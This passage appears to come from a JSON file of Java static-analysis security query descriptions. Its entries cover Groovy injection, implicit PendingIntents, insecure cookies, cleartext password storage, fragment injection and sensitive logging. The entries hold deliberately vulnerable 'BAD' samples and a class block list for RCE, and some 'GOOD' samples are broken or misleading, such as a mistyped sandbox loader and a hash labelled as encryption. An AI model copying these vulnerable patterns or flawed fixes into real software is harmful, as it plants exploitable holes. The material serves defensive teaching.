Paths.get(\"/home/\" + user + \"/public\").normalize().toAbsolutePath();\n\tPath filePath = publicFolder.resolve(filename).normalize().toAbsolutePath();\n\n\t// GOOD: ensure that the path stays within the public folder\n\tif (!filePath.startsWith(publicFolder + File.separator)) {\n\t\tthrow new IllegalArgumentException(\"Invalid filename\");\n\t}\n\tBufferedReader fileReader = new BufferedReader(new FileReader(filePath.toString()));\n\tString fileLine = fileReader.readLine();\n\twhile(fileLine != null) {\n\t\tsock.getOutputStream().write(fileLine.getBytes());\n\t\tfileLine = fileReader.readLine();\n\t}\n}\n```\n\n## References\n* OWASP: [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal).\n* Common Weakness Enumeration: [CWE-22](https://cwe.mitre.org/data/definitions/22.html).\n* Common Weakness Enumeration: [CWE-23](https://cwe.mitre.org/data/definitions/23.html).\n* Common Weakness Enumeration: [CWE-36](https://cwe.mitre.org/data/definitions/36.html).\n* Common Weakness Enumeration: [CWE-73](https://cwe.mitre.org/data/definitions/73.html).\n"
  },
  "java/groovy-injection": {
    "name": "Groovy Language injection",
    "description": "Evaluation of a user-controlled Groovy script may lead to arbitrary code execution.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.3,
    "precision": "high",
    "id": "java/groovy-injection",
    "tags": [
      "security",
      "external/cwe/cwe-094"
    ],
    "filename": "b76141d8-GroovyInjection",
    "language": "java",
    "help": "# Groovy Language injection\nApache Groovy is a powerful, optionally typed and dynamic language, with static-typing and static compilation capabilities. It integrates smoothly with any Java program, and immediately delivers to your application powerful features, including scripting capabilities, Domain-Specific Language authoring, runtime and compile-time meta-programming and functional programming. If a Groovy script is built using attacker-controlled data, and then evaluated, then it may allow the attacker to achieve RCE.\n\n\n## Recommendation\nIt is generally recommended to avoid using untrusted input in a Groovy evaluation. If this is not possible, use a sandbox solution. Developers must also take care that Groovy compile-time metaprogramming can also lead to RCE: it is possible to achieve RCE by compiling a Groovy script (see the article \"Abusing Meta Programming for Unauthenticated RCE!\" linked below). Groovy's `SecureASTCustomizer` allows securing source code by controlling what code constructs are permitted. This is typically done when using Groovy for its scripting or domain specific language (DSL) features. The fundamental problem is that Groovy is a dynamic language, yet `SecureASTCustomizer` works by looking at Groovy AST statically. This makes it very easy for an attacker to bypass many of the intended checks (see \\[Groovy SecureASTCustomizer is harmful\\](https://kohsuke.org/2012/04/27/groovy-secureastcustomizer-is-harmful/)). Therefore, besides `SecureASTCustomizer`, runtime checks are also necessary before calling Groovy methods (see \\[Improved sandboxing of Groovy scripts\\](https://melix.github.io/blog/2015/03/sandboxing.html)). It is also possible to use a block-list method, excluding unwanted classes from being loaded by the JVM. This method is not always recommended, because block-lists can be bypassed by unexpected values.\n\n\n## Example\nThe following example uses untrusted data to evaluate a Groovy script.\n\n\n```java\npublic class GroovyInjection {\n    void injectionViaClassLoader(HttpServletRequest request) {    \n        String script = request.getParameter(\"script\");\n        final GroovyClassLoader classLoader = new GroovyClassLoader();\n        Class groovy = classLoader.parseClass(script);\n        GroovyObject groovyObj = (GroovyObject) groovy.newInstance();\n    }\n\n    void injectionViaEval(HttpServletRequest request) {\n        String script = request.getParameter(\"script\");\n        Eval.me(script);\n    }\n\n    void injectionViaGroovyShell(HttpServletRequest request) {\n        GroovyShell shell = new GroovyShell();\n        String script = request.getParameter(\"script\");\n        shell.evaluate(script);\n    }\n\n    void injectionViaGroovyShellGroovyCodeSource(HttpServletRequest request) {\n        GroovyShell shell = new GroovyShell();\n        String script = request.getParameter(\"script\");\n        GroovyCodeSource gcs = new GroovyCodeSource(script, \"test\", \"Test\");\n        shell.evaluate(gcs);\n    }\n}\n\n\n```\nThe following example uses classloader block-list approach to exclude loading dangerous classes.\n\n\n```java\npublic class SandboxGroovyClassLoader extends ClassLoader {\n    public SandboxGroovyClassLoader(ClassLoader parent) {\n        super(parent);\n    }\n\n    /* override `loadClass` here to prevent loading sensitive classes, such as `java.lang.Runtime`, `java.lang.ProcessBuilder`, `java.lang.System`, etc.  */\n    /* Note we must also block `groovy.transform.ASTTest`, `groovy.lang.GrabConfig` and `org.buildobjects.process.ProcBuilder` to prevent compile-time RCE. */\n\n    static void runWithSandboxGroovyClassLoader() throws Exception {\n        // GOOD: route all class-loading via sand-boxing classloader.\n        SandboxGroovyClassLoader classLoader = new GroovyClassLoader(new SandboxGroovyClassLoader());\n        \n        Class<?> scriptClass = classLoader.parseClass(untrusted.getQueryString());\n        Object scriptInstance = scriptClass.newInstance();\n        Object result = scriptClass.getDeclaredMethod(\"bar\", new Class[]{}).invoke(scriptInstance, new Object[]{});\n    }\n}\n```\n\n## References\n* Orange Tsai: [Abusing Meta Programming for Unauthenticated RCE!](https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html).\n* C\u00e9dric Champeau: [Improved sandboxing of Groovy scripts](https://melix.github.io/blog/2015/03/sandboxing.html).\n* Kohsuke Kawaguchi: [Groovy SecureASTCustomizer is harmful](https://kohsuke.org/2012/04/27/groovy-secureastcustomizer-is-harmful/).\n* Welk1n: [Groovy Injection payloads](https://github.com/welk1n/exploiting-groovy-in-Java/).\n* Charles Chan: [Secure Groovy Script Execution in a Sandbox](https://levelup.gitconnected.com/secure-groovy-script-execution-in-a-sandbox-ea39f80ee87/).\n* Eugene: [Scripting and sandboxing in a JVM environment](https://stringconcat.com/en/scripting-and-sandboxing/).\n* Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).\n"
  },
  "java/android/implicit-pendingintents": {
    "name": "Use of implicit PendingIntents",
    "description": "Sending an implicit and mutable 'PendingIntent' to an unspecified third party component may provide an attacker with access to internal components of the application or cause other unintended effects.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 8.2,
    "precision": "high",
    "id": "java/android/implicit-pendingintents",
    "tags": [
      "security",
      "external/cwe/cwe-927"
    ],
    "filename": "fb706418-ImplicitPendingIntents",
    "language": "java",
    "help": "# Use of implicit PendingIntents\nA `PendingIntent` is used to wrap an `Intent` that will be supplied and executed by another application. When the `Intent` is executed, it behaves as if it were run directly by the supplying application, using the privileges of that application.\n\nIf a `PendingIntent` is configured to be mutable, the fields of its internal `Intent` can be changed by the receiving application if they were not previously set. This means that a mutable `PendingIntent` that has not defined a destination component (that is, an implicit `PendingIntent`) can be altered to execute an arbitrary action with the privileges of the application that created it.\n\nA malicious application can access an implicit `PendingIntent` as follows:\n\n* It is wrapped and sent as an extra of another implicit `Intent`.\n* It is sent as the action of a `Slide`.\n* It is sent as the action of a `Notification`.\n\n\nOn gaining access, the attacker can modify the underlying `Intent` and execute an arbitrary action with elevated privileges. This could give the malicious application access to private components of the victim application, or the ability to perform actions without having the necessary permissions.\n\n\n## Recommendation\nAvoid creating implicit `PendingIntent`s. This means that the underlying `Intent` should always have an explicit destination component.\n\nWhen you add the `PendingIntent` as an extra of another `Intent`, make sure that this second `Intent` also has an explicit destination component, so that it is not delivered to untrusted applications.\n\nCreate the `PendingIntent` using the flag `FLAG_IMMUTABLE` whenever possible, to prevent the destination component from modifying empty fields of the underlying `Intent`.\n\n\n## Example\nIn the following examples, a `PendingIntent` is created and wrapped as an extra of another `Intent`.\n\nIn the first example, both the `PendingIntent` and the `Intent` it is wrapped in are implicit, making them vulnerable to attack.\n\nIn the second example, the issue is avoided by adding explicit destination components to the `PendingIntent` and the wrapping `Intent`.\n\nThe third example uses the `FLAG_IMMUTABLE` flag to prevent the underlying `Intent` from being modified by the destination component.\n\n\n```java\nimport android.app.Activity;\nimport android.app.PendingIntent;\nimport android.content.Intent;\nimport android.os.Bundle;\n\npublic class ImplicitPendingIntents extends Activity {\n\n\tpublic void onCreate(Bundle savedInstance) {\n\t\t{\n\t\t\t// BAD: an implicit Intent is used to create a PendingIntent.\n\t\t\t// The PendingIntent is then added to another implicit Intent\n\t\t\t// and started.\n\t\t\tIntent baseIntent = new Intent();\n\t\t\tPendingIntent pi =\n\t\t\t\t\tPendingIntent.getActivity(this, 0, baseIntent, PendingIntent.FLAG_ONE_SHOT);\n\t\t\tIntent fwdIntent = new Intent(\"SOME_ACTION\");\n\t\t\tfwdIntent.putExtra(\"fwdIntent\", pi);\n\t\t\tsendBroadcast(fwdIntent);\n\t\t}\n\n\t\t{\n\t\t\t// GOOD: both the PendingIntent and the wrapping Intent are explicit.\n\t\t\tIntent safeIntent = new Intent(this, AnotherActivity.class);\n\t\t\tPendingIntent pi =\n\t\t\t\t\tPendingIntent.getActivity(this, 0, safeIntent, PendingIntent.FLAG_ONE_SHOT);\n\t\t\tIntent fwdIntent = new Intent();\n\t\t\tfwdIntent.setClassName(\"destination.package\", \"DestinationClass\");\n\t\t\tfwdIntent.putExtra(\"fwdIntent\", pi);\n\t\t\tstartActivity(fwdIntent);\n\t\t}\n\n\t\t{\n\t\t\t// GOOD: The PendingIntent is created with FLAG_IMMUTABLE.\n\t\t\tIntent baseIntent = new Intent(\"SOME_ACTION\");\n\t\t\tPendingIntent pi =\n\t\t\t\t\tPendingIntent.getActivity(this, 0, baseIntent, PendingIntent.FLAG_IMMUTABLE);\n\t\t\tIntent fwdIntent = new Intent();\n\t\t\tfwdIntent.setClassName(\"destination.package\", \"DestinationClass\");\n\t\t\tfwdIntent.putExtra(\"fwdIntent\", pi);\n\t\t\tstartActivity(fwdIntent);\n\t\t}\n\t}\n}\n\n```\n\n## References\n* Google Help: [ Remediation for Implicit PendingIntent Vulnerability ](https://support.google.com/faqs/answer/10437428?hl=en)\n* University of Potsdam: [ PIAnalyzer: A precise approach for PendingIntent vulnerability analysis ](https://www.cs.uni-potsdam.de/se/papers/esorics18.pdf)\n* Common Weakness Enumeration: [CWE-927](https://cwe.mitre.org/data/definitions/927.html).\n"
  },
  "java/insecure-cookie": {
    "name": "Failure to use secure cookies",
    "description": "Insecure cookies may be sent in cleartext, which makes them vulnerable to interception.",
    "kind": "problem",
    "problem.severity": "error",
    "security-severity": 5.0,
    "precision": "high",
    "id": "java/insecure-cookie",
    "tags": [
      "security",
      "external/cwe/cwe-614"
    ],
    "filename": "2b480fc4-InsecureCookie",
    "language": "java",
    "help": "# Failure to use secure cookies\nFailing to set the 'secure' flag on a cookie can cause it to be sent in cleartext. This makes it easier for an attacker to intercept.\n\n\n## Recommendation\nAlways use `setSecure` to set the 'secure' flag on a cookie before adding it to an `HttpServletResponse`.\n\n\n## Example\nThis example shows two ways of adding a cookie to an `HttpServletResponse`. The first way leaves out the setting of the 'secure' flag; the second way includes the setting of the flag.\n\n\n```java\npublic static void test(HttpServletRequest request, HttpServletResponse response) {\n\t{\n\t\tCookie cookie = new Cookie(\"secret\", \"fakesecret\");\n\t\t\n\t\t// BAD: 'secure' flag not set\n\t\tresponse.addCookie(cookie);\n\t}\n\n\t{\n\t\tCookie cookie = new Cookie(\"secret\", \"fakesecret\");\n\t\t\n\t\t// GOOD: set 'secure' flag\n\t\tcookie.setSecure(true);\n\t\tresponse.addCookie(cookie);\n\t}\n}\n```\n\n## References\n* SEI CERT Oracle Coding Standard for Java: [SER03-J. Do not serialize unencrypted, sensitive data](https://wiki.sei.cmu.edu/confluence/display/java/SER03-J.+Do+not+serialize+unencrypted+sensitive+data).\n* Java Platform, Enterprise Edition (Java EE) 7, API Specification: [Class Cookie](https://docs.oracle.com/javaee/7/api/javax/servlet/http/Cookie.html).\n* Common Weakness Enumeration: [CWE-614](https://cwe.mitre.org/data/definitions/614.html).\n"
  },
  "java/untrusted-data-to-external-api": {
    "name": "Untrusted data passed to external API",
    "description": "Data provided remotely is used in this external API without sanitization, which could be a security risk.",
    "id": "java/untrusted-data-to-external-api",
    "kind": "path-problem",
    "precision": "low",
    "problem.severity": "error",
    "security-severity": 7.8,
    "tags": [
      "security external/cwe/cwe-20"
    ],
    "filename": "462a50c1-UntrustedDataToExternalAPI",
    "language": "java",
    "help": "# Untrusted data passed to external API\nUsing unsanitized untrusted data in an external API can cause a variety of security issues. This query reports external APIs that use untrusted data. The results are not filtered so that you can audit all examples. The query provides data for security reviews of the application and you can also use it to identify external APIs that should be modeled as either taint steps, or sinks for specific problems.\n\nAn external API is defined as a method call to a method that is not defined in the source code, not overridden in the source code, and is not modeled as a taint step in the default taint library. External APIs may be from the Java standard library, third-party dependencies or from internal dependencies. The query reports uses of untrusted data in either the qualifier or as one of the arguments of external APIs.\n\n\n## Recommendation\nFor each result:\n\n* If the result highlights a known sink, confirm that the result is reported by the relevant query, or that the result is a false positive because this data is sanitized.\n* If the result highlights an unknown sink for a problem, then add modeling for the sink to the relevant query, and confirm that the result is either found, or is safe due to appropriate sanitization.\n* If the result represents a call to an external API that transfers taint, add the appropriate modeling, and re-run the query to determine what new results have appeared due to this additional modeling.\nOtherwise, the result is likely uninteresting. Custom versions of this query can extend the `SafeExternalAPIMethod` class to exclude known safe external APIs from future analysis.\n\n\n## Example\nIn this first example, a request parameter is read from `HttpServletRequest` and then ultimately used in a call to the `HttpServletResponse.sendError` external API:\n\n\n```java\npublic class XSS extends HttpServlet {\n\tprotected void doGet(HttpServletRequest request, HttpServletResponse response)\n\tthrows ServletException, IOException {\n\t\t// BAD: a request parameter is written directly to an error response page\n\t\tresponse.sendError(HttpServletResponse.SC_NOT_FOUND,\n\t\t\t\t\"The page \\\"\" + request.getParameter(\"page\") + \"\\\" was not found.\");\n\t}\n}\n\n```\nThis is an XSS sink. The XSS query should therefore be reviewed to confirm that this sink is appropriately modeled, and if it is, to confirm that the query reports this particular result, or that the result is a false positive due to some existing sanitization.\n\nIn this second example, again a request parameter is read from `HttpServletRequest`.\n\n\n```java\npublic class SQLInjection extends HttpServlet {\n\tprotected void doGet(HttpServletRequest request, HttpServletResponse response)\n\tthrows ServletException, IOException {\n\n\t\tStringBuilder sqlQueryBuilder = new StringBuilder();\n\t\tsqlQueryBuilder.append(\"SELECT * FROM user WHERE user_id='\");\n\t\tsqlQueryBuilder.append(request.getParameter(\"user_id\"));\n\t\tsqlQueryBuilder.append(\"'\");\n\n\t\t// ...\n\t}\n}\n\n```\nIf the query reported the call to `StringBuilder.append` on line 7, this would suggest that this external API is not currently modeled as a taint step in the taint tracking library. The next step would be to model this as a taint step, then re-run the query to determine what additional results might be found. In this example, it seems likely that the result of the `StringBuilder` will be executed as an SQL query, potentially leading to an SQL injection vulnerability.\n\nNote that both examples are correctly handled by the standard taint tracking library and XSS query.\n\n\n## References\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n"
  },
  "java/android/cleartext-storage-filesystem": {
    "name": "Cleartext storage of sensitive information in the Android filesystem",
    "description": "Cleartext storage of sensitive information in the Android filesystem allows access for users with root privileges or unexpected exposure from chained vulnerabilities.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "medium",
    "id": "java/android/cleartext-storage-filesystem",
    "tags": [
      "security",
      "external/cwe/cwe-312"
    ],
    "filename": "c3bb55c3-CleartextStorageAndroidFilesystem",
    "language": "java",
    "help": "# Cleartext storage of sensitive information in the Android filesystem\nAndroid applications with the appropriate permissions can write files either to the device external storage or the application internal storage, depending on the application's needs. However, sensitive information should not be saved in cleartext. Otherwise it can be accessed by any process or user in rooted devices, or can be disclosed through chained vulnerabilities, like unexpected access to the private storage through exposed components.\n\n\n## Recommendation\nConsider using the `EncryptedFile` class to work with files containing sensitive data. Alternatively, use encryption algorithms to encrypt the sensitive data being stored.\n\n\n## Example\nIn the first example, sensitive user information is stored in cleartext using a local file.\n\nIn the second and third examples, the code encrypts sensitive information before saving it to the filesystem.\n\n\n```java\npublic void fileSystemStorageUnsafe(String name, String password) {\n\t// BAD - sensitive data stored in cleartext\n    FileWriter fw = new FileWriter(\"some_file.txt\");\n    fw.write(name + \":\" + password);\n    fw.close();\n}\n\npublic void filesystemStorageEncryptedFileSafe(Context context, String name, String password) {\n\t// GOOD - the whole file is encrypted with androidx.security.crypto.EncryptedFile\n    File file = new File(\"some_file.txt\");\n    String masterKeyAlias = MasterKeys.getOrCreate(MasterKeys.AES256_GCM_SPEC);\n    EncryptedFile encryptedFile = new EncryptedFile.Builder(\n        file,\n        context,\n        masterKeyAlias,\n        EncryptedFile.FileEncryptionScheme.AES256_GCM_HKDF_4KB\n    ).build();\n\tFileOutputStream encryptedOutputStream = encryptedFile.openFileOutput();\n\tencryptedOutputStream.write(name + \":\" + password);\n}\n\npublic void fileSystemStorageSafe(String name, String password) {\n\t// GOOD - sensitive data is encrypted using a custom method\n    FileWriter fw = new FileWriter(\"some_file.txt\");\n    fw.write(name + \":\" + encrypt(password));\n    fw.close();\n}\n\nprivate static String encrypt(String cleartext) {\n    // Use an encryption or strong hashing algorithm in the real world.\n    // The example below just returns a SHA-256 hash.\n    MessageDigest digest = MessageDigest.getInstance(\"SHA-256\");\n    byte[] hash = digest.digest(cleartext.getBytes(StandardCharsets.UTF_8));\n    String encoded = Base64.getEncoder().encodeToString(hash);\n    return encoded;\n}\n\n```\n\n## References\n* Android Developers: [Work with data more securely](https://developer.android.com/topic/security/data)\n* Android Developers: [EncryptedFile](https://developer.android.com/reference/androidx/security/crypto/EncryptedFile)\n* Common Weakness Enumeration: [CWE-312](https://cwe.mitre.org/data/definitions/312.html).\n"
  },
  "java/android/cleartext-storage-shared-prefs": {
    "name": "Cleartext storage of sensitive information using `SharedPreferences` on Android",
    "description": "Cleartext Storage of Sensitive Information using SharedPreferences on Android allows access for users with root privileges or unexpected exposure from chained vulnerabilities.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "medium",
    "id": "java/android/cleartext-storage-shared-prefs",
    "tags": [
      "security",
      "external/cwe/cwe-312"
    ],
    "filename": "c3bb55c3-CleartextStorageSharedPrefs",
    "language": "java",
    "help": "# Cleartext storage of sensitive information using `SharedPreferences` on Android\n`SharedPreferences` is an Android API that stores application preferences using simple sets of data values. It allows you to easily save, alter, and retrieve the values stored in a user's profile. However, sensitive information should not be saved in cleartext. Otherwise it can be accessed by any process or user in rooted devices, or can be disclosed through chained vulnerabilities, like unexpected access to the private storage through exposed components.\n\n\n## Recommendation\nUse the `EncryptedSharedPreferences` API or other encryption algorithms for storing sensitive information.\n\n\n## Example\nIn the first example, sensitive user information is stored in cleartext.\n\nIn the second and third examples, the code encrypts sensitive information before saving it to the device.\n\n\n```java\npublic void testSetSharedPrefs(Context context, String name, String password)\n{\n\t{\n\t\t// BAD - sensitive information saved in cleartext.\n\t\tSharedPreferences sharedPrefs = context.getSharedPreferences(\"user_prefs\", Context.MODE_PRIVATE);\n\t\tEditor editor = sharedPrefs.edit();\n\t\teditor.putString(\"name\", name);\n\t\teditor.putString(\"password\", password);\n\t\teditor.commit();\n\t}\n\n\t{\n\t\t// GOOD - save sensitive information encrypted with a custom method.\n\t\tSharedPreferences sharedPrefs = context.getSharedPreferences(\"user_prefs\", Context.MODE_PRIVATE);\n\t\tEditor editor = sharedPrefs.edit();\n\t\teditor.putString(\"name\", encrypt(name));\n\t\teditor.putString(\"password\", encrypt(password));\n\t\teditor.commit();\n\t}\n\n\t{\n\t\t// GOOD - sensitive information saved using the built-in `EncryptedSharedPreferences` class in androidx.\n\t\tMasterKey masterKey = new MasterKey.Builder(context, MasterKey.DEFAULT_MASTER_KEY_ALIAS)\n\t\t\t.setKeyScheme(MasterKey.KeyScheme.AES256_GCM)\n\t\t\t.build();\n\n\t\tSharedPreferences sharedPreferences = EncryptedSharedPreferences.create(\n\t\t\tcontext,\n\t\t\t\"secret_shared_prefs\",\n\t\t\tmasterKey,\n\t\t\tEncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,\n\t\t\tEncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM);\n\n\t\tSharedPreferences.Editor editor = sharedPreferences.edit();\n\t\teditor.putString(\"name\", name);\n\t\teditor.putString(\"password\", password);\n\t\teditor.commit();\n\t}\n}\n\nprivate static String encrypt(String cleartext) throws Exception {\n\t// Use an encryption or hashing algorithm in real world. The demo below just returns its\n\t// hash.\n\tMessageDigest digest = MessageDigest.getInstance(\"SHA-256\");\n\tbyte[] hash = digest.digest(cleartext.getBytes(StandardCharsets.UTF_8));\n\tString encoded = Base64.getEncoder().encodeToString(hash);\n\treturn encoded;\n}\n\n```\n\n## References\n* Android Developers: [Work with data more securely](https://developer.android.com/topic/security/data)\n* ProAndroidDev: [Encrypted Preferences in Android](https://proandroiddev.com/encrypted-preferences-in-android-af57a89af7c8)\n* Common Weakness Enumeration: [CWE-312](https://cwe.mitre.org/data/definitions/312.html).\n"
  },
  "java/android/fragment-injection-preference-activity": {
    "name": "Android fragment injection in PreferenceActivity",
    "description": "An insecure implementation of the 'isValidFragment' method of the 'PreferenceActivity' class may allow a malicious application to bypass access controls, exposing the application to unintended effects.",
    "kind": "problem",
    "problem.severity": "error",
    "security-severity": 9.8,
    "precision": "high",
    "id": "java/android/fragment-injection-preference-activity",
    "tags": [
      "security",
      "external/cwe/cwe-470"
    ],
    "filename": "2ad411f3-FragmentInjectionInPreferenceActivity",
    "language": "java",
    "help": "# Android fragment injection in PreferenceActivity\nWhen fragments are instantiated with externally provided names, this exposes any exported activity that dynamically creates and hosts the fragment to fragment injection. A malicious application could provide the name of an arbitrary fragment, even one not designed to be externally accessible, and inject it into the activity. This can bypass access controls and expose the application to unintended effects.\n\nFragments are reusable parts of an Android application's user interface. Even though a fragment controls its own lifecycle and layout, and handles its input events, it cannot exist on its own: it must be hosted either by an activity or another fragment. This means that, normally, a fragment will be accessible by third-party applications (that is, exported) only if its hosting activity is itself exported.\n\n\n## Recommendation\nIn general, do not instantiate classes (including fragments) with user-provided names unless the name has been properly validated. Also, if an exported activity is extending the `PreferenceActivity` class, make sure that the `isValidFragment` method is overriden and only returns `true` when the provided `fragmentName` points to an intended fragment.\n\n\n## Example\nThe following example shows two cases: in the first one, untrusted data is used to instantiate and add a fragment to an activity, while in the second one, a fragment is safely added with a static name.\n\n\n```java\npublic class MyActivity extends FragmentActivity {\n\n    @Override\n    protected void onCreate(Bundle savedInstance) {\n        try {\n            super.onCreate(savedInstance);\n            // BAD: Fragment instantiated from user input without validation\n            {\n                String fName = getIntent().getStringExtra(\"fragmentName\");\n                getFragmentManager().beginTransaction().replace(com.android.internal.R.id.prefs,\n                        Fragment.instantiate(this, fName, null)).commit();\n            }\n            // GOOD: Fragment instantiated statically\n            {\n                getFragmentManager().beginTransaction()\n                        .replace(com.android.internal.R.id.prefs, new MyFragment()).commit();\n            }\n        } catch (Exception e) {\n        }\n    }\n\n}\n\n```\nThe next example shows two activities that extend `PreferenceActivity`. The first activity overrides `isValidFragment`, but it wrongly returns `true` unconditionally. The second activity correctly overrides `isValidFragment` so that it only returns `true` when `fragmentName` is a trusted fragment name.\n\n\n```java\nclass UnsafeActivity extends PreferenceActivity {\n\n    @Override\n    protected boolean isValidFragment(String fragmentName) {\n        // BAD: any Fragment name can be provided.\n        return true;\n    }\n}\n\n\nclass SafeActivity extends PreferenceActivity {\n    @Override\n    protected boolean isValidFragment(String fragmentName) {\n        // Good: only trusted Fragment names are allowed.\n        return SafeFragment1.class.getName().equals(fragmentName)\n                || SafeFragment2.class.getName().equals(fragmentName)\n                || SafeFragment3.class.getName().equals(fragmentName);\n    }\n\n}\n\n\n```\n\n## References\n* Google Help: [How to fix Fragment Injection vulnerability](https://support.google.com/faqs/answer/7188427?hl=en).\n* IBM Security Systems: [Android collapses into Fragments](https://securityintelligence.com/wp-content/uploads/2013/12/android-collapses-into-fragments.pdf).\n* Android Developers: [Fragments](https://developer.android.com/guide/fragments)\n* Common Weakness Enumeration: [CWE-470](https://cwe.mitre.org/data/definitions/470.html).\n"
  },
  "java/password-in-configuration": {
    "name": "Password in configuration file",
    "description": "Finds passwords in configuration files.",
    "kind": "problem",
    "problem.severity": "warning",
    "precision": "medium",
    "id": "java/password-in-configuration",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-555",
      "external/cwe/cwe-256",
      "external/cwe/cwe-260"
    ],
    "filename": "cfd9c624-PasswordInConfigurationFile",
    "language": "java",
    "help": "# Password in configuration file\nStoring a plaintext password in a configuration file allows anyone who can read the file to access the password-protected resources.\n\n\n## Recommendation\nPasswords stored in configuration files should be encrypted. Utilities provided by application servers like keystore and password vault can be used to encrypt and manage passwords.\n\n\n## Example\nIn the first example, the password of a datasource configuration is stored in cleartext in the context.xml file of a Java EE application.\n\nIn the second example, the password of a datasource configuration is encrypted and managed by a password vault.\n\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<Context>\n    <!-- BAD: Password of datasource is not encrypted -->\n    <Resource name=\"jdbc/exampleDS\" auth=\"Container\" type=\"javax.sql.DataSource\"\n               maxTotal=\"100\" maxIdle=\"30\" maxWaitMillis=\"10000\"\n               username=\"root\" password=\"1234\"\n               driverClassName=\"com.mysql.jdbc.Driver\"\n               url=\"jdbc:mysql://www.example.com:3306/proj\"/>\n\n    <!-- GOOD: Password is encrypted and stored in a password vault -->\n    <Resource name=\"jdbc/exampleDS\" auth=\"Container\" type=\"javax.sql.DataSource\"\n               maxTotal=\"100\" maxIdle=\"30\" maxWaitMillis=\"10000\"\n               username=\"root\" password=\"${VAULT::exampleDS::password::N2NhZDYzOTMtNWE0OS00ZGQ0LWE4MmEtMWNlMDMyNDdmNmI2TElORV9CUkVBS3ZhdWx0}\"\n               driverClassName=\"com.mysql.jdbc.Driver\"\n               url=\"jdbc:mysql://www.example.com:3306/proj\"/>\n\n</Context>\n```\n\n## References\n* CWE: [CWE-555: J2EE Misconfiguration: Plaintext Password in Configuration File](https://cwe.mitre.org/data/definitions/555.html)\n* RedHat Security Guide: [Store and Retrieve Encrypted Sensitive Strings in the Java Keystore](https://access.redhat.com/documentation/en-us/jboss_enterprise_application_platform/6.1/html/security_guide/Store_and_Retrieve_Encrypted_Sensitive_Strings_in_the_Java_Keystore)\n* SonarSource: [Hard-coded credentials are security-sensitive](https://rules.sonarsource.com/java/RSPEC-2068)\n* Common Weakness Enumeration: [CWE-555](https://cwe.mitre.org/data/definitions/555.html).\n* Common Weakness Enumeration: [CWE-256](https://cwe.mitre.org/data/definitions/256.html).\n* Common Weakness Enumeration: [CWE-260](https://cwe.mitre.org/data/definitions/260.html).\n"
  },
  "java/main-method-in-web-components": {
    "name": "Main Method in Java EE Web Components",
    "description": "Java EE web applications with a main method.",
    "kind": "problem",
    "problem.severity": "warning",
    "precision": "medium",
    "id": "java/main-method-in-web-components",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-489"
    ],
    "filename": "41baf539-WebComponentMain",
    "language": "java",
    "help": "# Main Method in Java EE Web Components\nDebug code can create unintended entry points in a deployed Java EE web application therefore should never make into production. There is no reason to have a main method in a Java EE web application. Having a main method in the Java EE application increases the attack surface that an attacker can exploit to attack the application logic.\n\n\n## Recommendation\nRemove the main method from web components including servlets, filters, and listeners.\n\n\n## Example\nThe following example shows two ways of implementing web components. In the 'BAD' case, a main method is implemented. In the 'GOOD' case, no main method is implemented.\n\n\n```java\npublic class WebComponentMain implements Servlet {\n\t// BAD - Implement a main method in servlet.\n\tpublic static void main(String[] args) throws Exception {\n\t\t// Connect to my server\n\t\tURL url = new URL(\"https://www.example.com\");\n\t\turl.openConnection();\n\t}\n\n\t// GOOD - Not to have a main method in servlet.\n}\n\n```\n\n## References\n* Fortify: [J2EE Bad Practices: Leftover Debug Code](https://vulncat.fortify.com/en/detail?id=desc.structural.java.j2ee_badpractices_leftover_debug_code)\n* SonarSource: [Web applications should not have a \"main\" method](https://rules.sonarsource.com/java/tag/owasp/RSPEC-2653)\n* Carnegie Mellon University: [ENV06-J. Production code must not contain debugging entry points](https://wiki.sei.cmu.edu/confluence/display/java/ENV06-J.+Production+code+must+not+contain+debugging+entry+points)\n* Common Weakness Enumeration: [CWE-489](https://cwe.mitre.org/data/definitions/489.html).\n"
  },
  "java/sensitive-log": {
    "name": "Insertion of sensitive information into log files",
    "description": "Writing sensitive information to log files can allow that information to be leaked to an attacker more easily.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "medium",
    "id": "java/sensitive-log",
    "tags": [
      "security",
      "external/cwe/cwe-532"
    ],
    "filename": "2d713f7a-SensitiveInfoLog",
    "language": "java",
    "help": "# Insertion of sensitive information into log files\nInformation written to log files can be of a sensitive nature and give valuable guidance to an attacker or expose sensitive user information. Third-party logging utilities like Log4J and SLF4J are widely used in Java projects. When sensitive information is written to logs without properly set logging levels, it is accessible to potential attackers who can use it to gain access to file storage.\n\n\n## Recommendation\nDo not write secrets into the log files and enforce proper logging level control.\n\n\n## Example\nThe following example shows two ways of logging sensitive information. In the 'BAD' case, the credentials are simply written to a debug log. In the 'GOOD' case, the credentials are never written to debug logs.\n\n\n```java\npublic static void main(String[] args) {\n    {\n        private static final Logger logger = LogManager.getLogger(SensitiveInfoLog.class);\n\n        String password = \"Pass@0rd\";\n\n        // BAD: user password is written to debug log\n        logger.debug(\"User password is \"+password);\n    }\n\t\n    {\n        private static final Logger logger = LogManager.getLogger(SensitiveInfoLog.class);\n  \n        String password = \"Pass@0rd\";\n\n        // GOOD: user password is never written to debug log\n        logger.debug(\"User password changed\")\n    }\n}\n\n```\n\n## References\n* [OWASP Logging Guide](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html)\n* Common Weakness Enumeration: [CWE-532](https://cwe.mitre.org/data/definitions/532.html).\n"
  },
  "java/lock-order-inconsistency": {
    "name": "Lock order inconsistency",
    "description": "Acquiring multiple locks in a different order may cause deadlock.",
    "kind": "problem",
    "problem.severity": "recommendation",
    "security-severity": 5.0,
    "precision": "medium",
    "id": "java/lock-order-inconsistency",
    "tags": [
      "security",
      "external/cwe/cwe-833"
    ],
    "filename": "8dad8dc1-LockOrderInconsistency",
